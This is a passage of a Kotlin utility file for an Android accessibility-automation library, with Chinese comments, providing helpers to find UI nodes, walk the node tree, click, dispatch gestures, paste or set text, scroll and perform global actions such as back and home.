     * 在当前元素范围下，通过id查找所有符合条件元素
     */
    fun AccessibilityNodeInfo?.findById(id: String): List<AccessibilityNodeInfo> {
        if (this == null) return arrayListOf()
        findAccessibilityNodeInfosByViewId(id)?.let {
            return it
        }
        return arrayListOf()
    }

    /**
     * 通过文本查找所有符合条件元素
     */
    fun findByText(text: String): List<AccessibilityNodeInfo> {
        return service?.rootInActiveWindow?.findByText(text) ?: arrayListOf()
    }

    /**
     * 根据文本查找所有文本相同的元素
     */
    fun findByTextAllMatch(text: String): List<AccessibilityNodeInfo> {
        val listResult = arrayListOf<AccessibilityNodeInfo>()
        val list = service?.rootInActiveWindow?.findByText(text)
        list?.let {
            it.forEach {
                if (TextUtils.equals(it.text, text)) {
                    listResult.add(it)
                }
            }
        }
        return listResult
    }

    /**
     * 在当前元素范围下，通过文本查找所有符合条件元素
     */
    fun AccessibilityNodeInfo?.findByText(text: String): List<AccessibilityNodeInfo> {
        if (this == null) return arrayListOf()
        findAccessibilityNodeInfosByText(text)?.let {
            return it
        }
        return arrayListOf()
    }
    /**
     * 在当前元素范围下，通过文本查找所有符合条件元素的对称
     */
    fun AccessibilityNodeInfo?.findDuichenByText(text: String): List<AccessibilityNodeInfo> {
        if (this == null) return arrayListOf()
        return findAccessibilityNodeInfosByText(text) ?: arrayListOf()
    }

    /**
     * 判断元素是否包含指定的文本
     */
    fun AccessibilityNodeInfo?.containsText(text: String): Boolean {
        if (this == null) return false
        getText()?.let {
            if (it.contains(text)) return true
        }
        contentDescription?.let {
            if (it.contains(text)) return true
        }
        return false
    }

    /**
     * 获取元素文本列表，包括text，content-desc
     */
    fun AccessibilityNodeInfo?.getAllText(text: String): ArrayList<String> {
        if (this == null) return arrayListOf()
        val texts = arrayListOf<String>()
        getText()?.let {
            texts.add(it.toString())
        }
        contentDescription?.let {
            texts.add(it.toString())
        }
        return texts
    }


    /**
     * 根据类型查找元素
     * @param className 完整类名，如[androidx.recyclerview.widget.RecyclerView]
     * @return 所有符合条件的元素
     */
    fun findByTags(className: String): List<AccessibilityNodeInfo> {
        val nodeList = arrayListOf<AccessibilityNodeInfo>()
        getAllNodes().forEach {
            if (TextUtils.equals(className, it.className)) {
                nodeList.add(it)
            }
        }
        return nodeList
    }

    /**
     * 在当前元素范围下，根据类型查找元素
     * @param className 完整类名，如[androidx.recyclerview.widget.RecyclerView]
     * @return 所有符合条件的元素
     */
    fun AccessibilityNodeInfo.findByTags(className: String): List<AccessibilityNodeInfo> {
        val nodeList = arrayListOf<AccessibilityNodeInfo>()
        getNodes().forEach {
            if (TextUtils.equals(className, it.className)) {
                nodeList.add(it)
            }
        }
        return nodeList
    }

    /**
     * 根据类型查找首个符合条件的父元素
     * @param className 完整类名，如[androidx.recyclerview.widget.RecyclerView]
     */
    fun AccessibilityNodeInfo.findFirstParentByTags(className: String): AccessibilityNodeInfo? {
        val nodeList = arrayListOf<AccessibilityNodeInfo>()
        findFirstParentByTags(className, nodeList)
        return nodeList.firstOrNull()
    }


    /**
     * 递归根据类型查找首个符合条件的父元素
     * @param className 完整类名，如[androidx.recyclerview.widget.RecyclerView]
     * @param container 存放结果容器
     */
    fun AccessibilityNodeInfo.findFirstParentByTags(className: String, container: ArrayList<AccessibilityNodeInfo>) {
        getParent()?.let {
            if (TextUtils.equals(className, it.className)) {
                container.add(it)
            } else {
                it.findFirstParentByTags(className, container)
            }
        }
    }

    /**
     * 获取所有元素
     */
    fun getAllNodes(): ArrayList<AccessibilityNodeInfo> {
        val nodeList = arrayListOf<AccessibilityNodeInfo>()
        service?.rootInActiveWindow?.getNodes(nodeList)
        return nodeList
    }

    /**
     * 获取当前元素下所有子元素
     */
    fun AccessibilityNodeInfo.getNodes(): ArrayList<AccessibilityNodeInfo> {
        val nodeList = arrayListOf<AccessibilityNodeInfo>()
        this.getNodes(nodeList)
        return nodeList
    }

    /**
     * 递归获取所有元素
     */
    private fun AccessibilityNodeInfo.getNodes(nodeList: ArrayList<AccessibilityNodeInfo>) {
        nodeList.add(this)
        if (nodeList.size > 10000) return
        for (index in 0 until this.childCount) {
            getChild(index)?.getNodes(nodeList)
        }
    }

    /**
     * 查找第一个可点击的父元素
     */
    fun AccessibilityNodeInfo.findFirstParentClickable(): AccessibilityNodeInfo? {
        arrayOfNulls<AccessibilityNodeInfo>(1).apply {
            findFirstParentClickable(this)
            return this[0]
        }
    }


    fun AccessibilityNodeInfo.findTwoParentClickable(): AccessibilityNodeInfo? {
        arrayOfNulls<AccessibilityNodeInfo>(2).apply {
            findFirstParentClickable(this)
            return this[1]
        }
    }

    /**
     * 查找可点击的父元素
     */
    private fun AccessibilityNodeInfo.findFirstParentClickable(nodeInfo: Array<AccessibilityNodeInfo?>) {
        if (parent?.isClickable == true) {
            nodeInfo[0] = parent
            return
        } else {
            parent?.findFirstParentClickable(nodeInfo)
        }
    }

    /**
     * 获取当前元素下的子元素（不包括子元素中的子元素）
     */
    fun AccessibilityNodeInfo.getChildren(): ArrayList<AccessibilityNodeInfo> {
        val nodes = arrayListOf<AccessibilityNodeInfo>()
        for (i in 0 until this.childCount) {
            val child = getChild(i)
            nodes.add(child)
        }
        return nodes
    }

    /**
     * 手势模拟，点或直线
     *
     * @param startLocation 开始位置，长度为2的数组，下标 0为 x坐标，下标 1为 y坐标
     * @param endLocation 结束位置
     * @param startTime 开始间隔时间
     * @param duration 持续时间
     */
    @JvmStatic
    suspend fun gesture(
        startLocation: FloatArray,
        endLocation: FloatArray,
        startTime: Long,
        duration: Long,
    ) {
        val path = Path()
        path.moveTo(startLocation[0], startLocation[1])
        path.lineTo(endLocation[0], endLocation[1])
        gesture(path, startTime, duration)
    }

    /**
     * 手势模拟
     * @param path 手势路径
     * @param startTime 开始间隔毫秒
     * @param duration 持续毫秒
     */
    @JvmStatic
    suspend fun gesture(
        path: Path,
        startTime: Long,
        duration: Long,
    ) {
        val builder = GestureDescription.Builder()
        val strokeDescription = GestureDescription.StrokeDescription(path, startTime, duration)
        val gestureDescription = builder.addStroke(strokeDescription).build()
        val deferred = CompletableDeferred<Int>()
        service?.dispatchGesture(gestureDescription, object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription) {
                deferred.complete(1)
            }

            override fun onCancelled(gestureDescription: GestureDescription) {
                deferred.complete(0)
            }
        }, null) ?: let {
            deferred.complete(0)
        }
        val result = deferred.await()
    }

    /**
     * 获取元素在屏幕中的范围
     */
    fun AccessibilityNodeInfo.getBoundsInScreen(): Rect {
        val boundsInScreen = Rect()
        getBoundsInScreen(boundsInScreen)
        return boundsInScreen
    }

    /**
     * 手势点击元素所处的位置
     */
    suspend fun AccessibilityNodeInfo.gestureClick() {
        val rect = getBoundsInScreen()
        gestureClick(rect.left + 15F, rect.top + 15F, 10)
    }

    /**
     * 点击元素
     * @return 执行结果，true成功，false失败
     */
    fun AccessibilityNodeInfo.click(): Boolean {
        return performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    /**
     * 手势长按元素所处的位置
     */
    suspend fun AccessibilityNodeInfo.gestureLongClick() {
        val rect = getBoundsInScreen()
        gestureClick(rect.left + 15F, rect.top + 15F, 1000)
    }

    /**
     * 点击屏幕指定位置
     * @param x 坐标
     * @param y 坐标
     */
    suspend fun gestureClick(
        x: Float,
        y: Float,
        duration: Long = 10
    ) {
        gesture(
            floatArrayOf(x, y), floatArrayOf(x, y),
            0,
            duration,
        )
    }

    /**
     * 返回
     * @return 执行结果，true成功，false失败
     */
    fun back(): Boolean {
        return service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) ?: false
    }


    /**
     * 回到主页
     * @return 执行结果，true成功，false失败
     */
    fun home(): Boolean {
        return service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) ?: false
    }

    /**
     * 显示通知栏
     * @return 执行结果，true成功，false失败
     */
    fun notifications(): Boolean {
        return service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS) ?: false
    }

    /**
     * 最近任务
     * @return 执行结果，true成功，false失败
     */
    fun tasks(): Boolean {
        return service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS) ?: false
    }

    /**
     * 粘贴文本到当前元素
     * @return 执行结果，true成功，false失败
     */
    fun AccessibilityNodeInfo.paste(text: String?): Boolean {
        performAction(AccessibilityNodeInfo.ACTION_FOCUS)
        service?.let {
            val clip = ClipData.newPlainText("${System.currentTimeMillis()}", text)
            val clipboardManager = (it.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            clipboardManager.setPrimaryClip(clip)
            clipboardManager.primaryClip
            return performAction(AccessibilityNodeInfo.ACTION_PASTE)
        }
        return false
    }

    /**
     * 选择输入框文本
     * @param selectionStart 文本起始下标
     * @param selectionEnd 文本结束下标
     * @return 执行结果，true成功，false失败
     */
    fun AccessibilityNodeInfo.selectionText(selectionStart: Int, selectionEnd: Int): Boolean {
        val selectionArgs = Bundle()
        selectionArgs.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, selectionStart)
        selectionArgs.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, selectionEnd)
        return performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, selectionArgs)
    }

    /**
     * 修改输入框文本内容
     * @return 执行结果，true成功，false失败
     */
    fun AccessibilityNodeInfo.setNodeText(text: String?): Boolean {
        text ?: return false
        return performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundleOf().apply {
            putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                text
            )
        })
    }

    /**
     * 根据基准分辨率宽度获取对应当前分辨率的x坐标
     */
    fun getX(baseWidth: Int, x: Int): Int {
        val screenWidth = ScreenUtils.getScreenWidth()
        return (x / baseWidth.toFloat() * screenWidth).toInt()
    }

    /**
     * 根据基准分辨率高度获取对应当前分辨率的y坐标
     */
    fun getY(baseHeight: Int, y: Int): Int {
        var screenHeight = ScreenUtils.getScreenHeight()
        if (screenHeight > baseHeight) {
            screenHeight = baseHeight
        }
        return (y.toFloat() / baseHeight * screenHeight).toInt()
    }


    /**
     * 获取当前app在屏幕中的位置，如果找不到android:id/content节点则为空
     */
    fun getAppBoundsInScreen(): Rect? {
        return service?.let {
            return@let findById("android:id/content").firstOrNull()?.getBoundsInScreen()
        }
    }


    /**
     * 初始化当前app在屏幕中的位置
     */
    fun initAppBoundsInScreen(): Rect? {
        return getAppBoundsInScreen().apply {
            appRectInScreen = this
        }
    }

    /**
     * 获取全局 Context
     */
    fun getContext(): Context {
        if (!::application.isInitialized) {
            throw IllegalStateException("Assists is not initialized. Call Assists.init(application) first.")
        }
        return application.applicationContext
    }

    /**
     * 获取当前app在屏幕中的宽度，获取前需要先执行initAppBoundsInScreen，避免getAppBoundsInScreen每次获取新的会耗时
     */
    fun getAppWidthInScreen(): Int {
        return appRectInScreen?.let {
            return@let it.right - it.left
        } ?: ScreenUtils.getScreenWidth()
    }


    /**
     * 获取当前app在屏幕中的高度，获取前需要先执行initAppBoundsInScreen，避免getAppBoundsInScreen每次获取新的会耗时
     */
    fun getAppHeightInScreen(): Int {
        return appRectInScreen?.let {
            return@let it.bottom - it.top
        } ?: ScreenUtils.getScreenHeight()
    }

    /**
     * 向前滚动（需元素是可滚动的）
     * @return 执行结果，true成功，false失败。false可作为滚动到底部或顶部依据
     */
    fun AccessibilityNodeInfo.scrollForward(): Boolean {
        return performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
    }

    /**
     * 向后滚动（需元素是可滚动的）
     * @return 执行结果，true成功，false失败。false可作为滚动到底部或顶部依据
     */
    fun AccessibilityNodeInfo.scrollBackward(): Boolean {
        return performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
    }

    /**
     * 控制台输出元素信息
     */
    fun AccessibilityNodeInfo.log(tag: String = LOG_TAG) {

        StringBuilder().apply {
            append("-------------------------------------\n")
            append("位置:left=${getBoundsInScreen().left}, top=${getBoundsInScreen().top}, right=${getBoundsInScreen().right}, bottom=${getBoundsInScreen().bottom} \n")
            append("文本:$text \n")
            append("内容描述:$contentDescription \n")
            append("id:$viewIdResourceName \n")
            append("类型:${className} \n")
            append("是否已经获取到到焦点:$isFocused \n")
            append("是否可滚动:$isScrollable \n")
            append("是否可点击:$isClickable \n")
            append("是否可用:$isEnabled \n")
            append("是否可用:$isEnabled \n")
            Log.d(tag, toString())
        }
    }



    // 手势提交函数
    fun dispatchGesture(path: Path) {
        val builder = GestureDescription.Builder()
        val strokeDescription = GestureDescription.StrokeDescription(
            path,
            0, // 无延迟
            500 // 持续时间，按路径复杂性调整
        )
        builder.addStroke(strokeDescription)

        service?.dispatchGesture(builder.build(), object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription) {
                // 手势完成回调
            }

            override fun onCancelled(gestureDescription: GestureDescription) {
                // 手势取消回调
            }
        }, null)
    }




}